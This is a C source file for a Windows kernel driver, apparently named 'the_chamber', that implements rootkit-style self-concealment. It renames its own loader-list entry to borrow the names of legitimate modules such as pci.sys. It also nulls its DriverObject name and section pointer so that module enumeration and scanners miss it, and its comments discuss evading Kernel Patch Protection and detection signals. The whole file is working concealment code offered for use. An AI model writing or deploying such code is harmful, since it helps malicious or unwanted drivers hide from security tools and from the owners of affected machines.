/* stealth.c -- module self-concealment.
 *
 * Phase 1.4: do NOT unlink from PsLoadedModuleList.
 * -------------------------------------------------
 * Kernel drivers are threaded on ONE list head (PsLoadedModuleList, chained
 * through KLDR_DATA_TABLE_ENTRY::InLoadOrderLinks). Earlier builds also
 * carried InMemoryOrderLinks and InInitializationOrderLinks on some module
 * objects, but PsLoadedModuleList itself walks only InLoadOrderLinks. An
 * unlink of any of those three on a build that tracks them structurally
 * (Win10 1703+, Win11 on Zen 4) is detected by Kernel Patch Protection and
 * bugchecks 0x109 (CRITICAL_STRUCTURE_CORRUPTION) within tens of minutes.
 *
 * Replacement scheme: locate our own KLDR_DATA_TABLE_ENTRY by name match,
 * locate a benign in-tree module (we use pci.sys -- always loaded on any
 * Windows kernel with PCI buses present, i.e. every supported configuration
 * on a 7700X) to serve as a donor, then overwrite our BaseDllName AND
 * FullDllName UNICODE_STRINGs with the donor's.
 *
 * Overwrite-all-fields rationale. The NT loader builds each
 * KLDR_DATA_TABLE_ENTRY's UNICODE_STRING{.Buffer, .Length, .MaximumLength}
 * atomically; any partial swap (e.g. overwriting Buffer while leaving
 * Length/MaximumLength from the old string) leaves a mismatch that:
 *   - trips the internal RtlEqualUnicodeString check used by the loader,
 *   - makes NtQuerySystemInformation(SystemModuleInformation) read past
 *     the end of the new Buffer or truncate it short, which is a stronger
 *     detection signal than the original unsanitized name,
 *   - may trigger PG header-integrity checks because Length no longer
 *     matches wcslen(Buffer) * 2.
 * So the write copies all three fields together.
 *
 * FullDllName in particular. NtQuerySystemInformation(SystemModuleInformation)
 * returns an ANSI FullPathName[256] built from FullDllName, not BaseDllName.
 * If we rename only BaseDllName, every NtQSI caller still sees the original
 * FullPathName that embeds the unredacted filename and FileName offset. So
 * both fields must move together.
 *
 * Revert on unload restores the original UNICODE_STRINGs so the loader's
 * unload path sees the correct names.
 */

#include "the_chamber.h"
#include "stealth.h"

typedef struct _KLDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG      Flags;
    USHORT     LoadCount;
    USHORT     TlsIndex;
    LIST_ENTRY HashLinks;
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;

extern LIST_ENTRY PsLoadedModuleList;

/* Phase 1.4 saved state for revert. */
static PKLDR_DATA_TABLE_ENTRY g_saved_entry        = NULL;
static UNICODE_STRING         g_saved_base_dll_name = { 0, 0, NULL };
static UNICODE_STRING         g_saved_full_dll_name = { 0, 0, NULL };
static UNICODE_STRING         g_saved_driver_name   = { 0, 0, NULL };
static PVOID                  g_saved_driver_section = NULL;
/* Set only after both the KLDR rename AND the DriverObject field saves
 * have succeeded.  stealth_revert refuses to restore DriverObject
 * fields unless this is TRUE so an early-returning apply does not
 * blit zero-initialized statics over drv->DriverName/DriverSection. */
static BOOLEAN                g_stealth_driver_saved = FALSE;

/* Case-insensitive wide comparison of e->BaseDllName against `want`.
 * `want` must be a zero-terminated WCHAR array; its terminator is not
 * counted. */
static BOOLEAN name_matches(PKLDR_DATA_TABLE_ENTRY e, const WCHAR *want) {
    USHORT want_n = 0;
    USHORT have_n;
    PWCH   p;
    SIZE_T j;

    if (!e || !want) return FALSE;
    have_n = e->BaseDllName.Length / sizeof(WCHAR);
    p = e->BaseDllName.Buffer;
    if (!p) return FALSE;

    while (want[want_n]) want_n++;
    if (have_n != want_n) return FALSE;

    for (j = 0; j < want_n; j++) {
        WCHAR a = p[j];
        WCHAR b = want[j];
        if (a >= L'A' && a <= L'Z') a = (WCHAR)(a - L'A' + L'a');
        if (b >= L'A' && b <= L'Z') b = (WCHAR)(b - L'A' + L'a');
        if (a != b) return FALSE;
    }
    return TRUE;
}

/* Phase 1.7: match our own KLDR entry by DllBase against the DriverObject's
 * DriverStart. The loader populates both to the same address (the image
 * load base) when it maps us, so this match is independent of whatever
 * filename the launcher chose at install time. Avoiding a hardcoded
 * WCHAR alias table also keeps every per-install branded filename out of
 * the release binary. */
static BOOLEAN is_our_module(PKLDR_DATA_TABLE_ENTRY e, PDRIVER_OBJECT drv) {
    if (!e || !drv) return FALSE;
    return (e->DllBase == drv->DriverStart);
}

/* Donor candidates in preference order. pci.sys is first because it is
 * loaded on every supported Zen 4 configuration (no PCI-less Windows
 * kernel shipped). The fallbacks cover cases where a locked-down system
 * image has stripped pci.sys for some reason (minimal WinPE, unusual
 * installations). All three donors are kernel-image modules with
 * stable UNICODE_STRING buffers; reading them after rename is safe for
 * as long as the donor itself stays loaded, and all three are
 * non-unloadable on normal builds. These donor names are legitimate OS
 * component names and never match the driver's own branded identity, so
 * they do not count as a brand leak in the release binary. */
static BOOLEAN is_donor_module(PKLDR_DATA_TABLE_ENTRY e) {
    static const WCHAR *donors[] = {
        L"pci.sys",
        L"acpi.sys",
        L"msrpc.sys",
    };
    SIZE_T i;
    for (i = 0; i < sizeof(donors)/sizeof(donors[0]); i++) {
        if (name_matches(e, donors[i])) return TRUE;
    }
    return FALSE;
}

NTSTATUS stealth_apply(PDRIVER_OBJECT drv) {
    PLIST_ENTRY head, cur;
    KIRQL irql;
    PKLDR_DATA_TABLE_ENTRY our_entry = NULL;
    PKLDR_DATA_TABLE_ENTRY donor = NULL;

    /* Phase 1.5: g_stealth_lock is initialized ONCE in DriverEntry. The
     * previous `static KSPIN_LOCK dummy; KeInitializeSpinLock(&dummy)`
     * pattern inside each entry reset the lock on every call, so a
     * concurrent walker could witness an incompletely-renamed KLDR
     * entry mid-operation. Acquire without re-init.
     *
     * Optional hardening (NOT implemented here): resolve the unexported
     * PsLoadedModuleResource (ERESOURCE) by pattern-scanning ntoskrnl,
     * raise to APC_LEVEL via KeEnterCriticalRegion, acquire the resource
     * exclusive with ExAcquireResourceExclusiveLite(..., TRUE), then
     * raise to DISPATCH_LEVEL for this spin lock. The reverse unwind on
     * release. That gives the strongest guarantee against the loader's
     * own walk, at the cost of pattern-scanning a kernel internal that
     * drifts build-to-build. The current spin-lock-only path is enough
     * for in-tree walkers (NtQuerySystemInformation) and we accept a
     * narrow race window against a bespoke loader-internal walker. */
    KeAcquireSpinLock(&g_stealth_lock, &irql);

    head = &PsLoadedModuleList;

    /* First pass: find our own KLDR_DATA_TABLE_ENTRY by DllBase match. */
    for (cur = head->Flink; cur != head; cur = cur->Flink) {
        PKLDR_DATA_TABLE_ENTRY e =
            CONTAINING_RECORD(cur, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (is_our_module(e, drv)) {
            our_entry = e;
            break;
        }
    }
    if (!our_entry) {
        KeReleaseSpinLock(&g_stealth_lock, irql);
        return STATUS_NOT_FOUND;
    }

    /* Second pass: find a donor module whose BaseDllName/FullDllName we
     * can clone. Skip ourselves. */
    for (cur = head->Flink; cur != head; cur = cur->Flink) {
        PKLDR_DATA_TABLE_ENTRY e =
            CONTAINING_RECORD(cur, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (e == our_entry) continue;
        if (is_donor_module(e)) {
            donor = e;
            break;
        }
    }
    if (!donor) {
        KeReleaseSpinLock(&g_stealth_lock, irql);
        return STATUS_NOT_FOUND;
    }

    /* Save originals, then overwrite BOTH UNICODE_STRINGs completely
     * (Buffer + Length + MaximumLength together). A partial swap is a
     * stronger tell than the original branded name (see file header). */
    g_saved_entry        = our_entry;
    g_saved_base_dll_name = our_entry->BaseDllName;
    g_saved_full_dll_name = our_entry->FullDllName;

    our_entry->BaseDllName = donor->BaseDllName;
    our_entry->FullDllName = donor->FullDllName;

    KeReleaseSpinLock(&g_stealth_lock, irql);

    /* DriverObject fields.
     *
     * BIG CAVEAT: nulling DriverSection breaks the driver-unload path.
     * IoUnloadDriver() and MmUnloadSystemImage() read DriverSection to
     * locate the KLDR entry for free. Setting it to NULL leaves that
     * code with a dangling reference and the unload becomes undefined.
     * This is only safe when the driver is designed NEVER to unload --
     * the watchdog/shutdown IOCTL path in this project calls
     * stealth_revert() first (see UnloadRoutine in the_chamber.c), which
     * restores the pointer before the loader needs it.
     *
     * Nulling DriverSection ALSO breaks any DriverObject->DriverSection->
     * DllBase self-base lookup. Note: it does NOT break
     * MmGetSystemRoutineAddress (that walks PsLoadedModuleList directly
     * via the ntoskrnl entry, not through any driver's DriverSection)
     * and does NOT break RtlPcToFileHeader (that walks the loader data
     * table through PsLoadedModuleList). Impact on minifilter driver
     * registration (FltRegisterFilter -> FilterManager internal state)
     * is UNVERIFIED; this driver is not a minifilter, so no concern here.
     *
     * DriverName cleared similarly, as before. The revert path restores
     * both fields. */
    if (drv) {
        g_saved_driver_name    = drv->DriverName;
        g_saved_driver_section = drv->DriverSection;
        g_stealth_driver_saved = TRUE;
        drv->DriverName.Length         = 0;
        drv->DriverName.MaximumLength  = 0;
        drv->DriverName.Buffer         = NULL;
        drv->DriverSection             = NULL;
    }

    CHAMBER_LOG("stealth applied (renamed; donor %wZ)\n", &donor->BaseDllName);
    return STATUS_SUCCESS;
}

NTSTATUS stealth_revert(PDRIVER_OBJECT drv) {
    KIRQL irql;
    BOOLEAN restore_driver;

    /* Phase 1.5: use the shared g_stealth_lock, no re-init. */
    KeAcquireSpinLock(&g_stealth_lock, &irql);
    if (g_saved_entry) {
        /* Restore original BaseDllName / FullDllName in full. */
        g_saved_entry->BaseDllName = g_saved_base_dll_name;
        g_saved_entry->FullDllName = g_saved_full_dll_name;
        g_saved_entry = NULL;
    }
    restore_driver = g_stealth_driver_saved;
    g_stealth_driver_saved = FALSE;
    KeReleaseSpinLock(&g_stealth_lock, irql);

    /* Only restore DriverObject fields if stealth_apply ran to
     * completion (and actually saved them).  An early-returning apply
     * leaves the save statics zeroed; blindly restoring from them
     * would write NULL DriverSection and MmUnloadSystemImage would
     * deref it. */
    if (drv && restore_driver) {
        drv->DriverName    = g_saved_driver_name;
        drv->DriverSection = g_saved_driver_section;
    }

    CHAMBER_LOG("stealth reverted\n");
    return STATUS_SUCCESS;
}
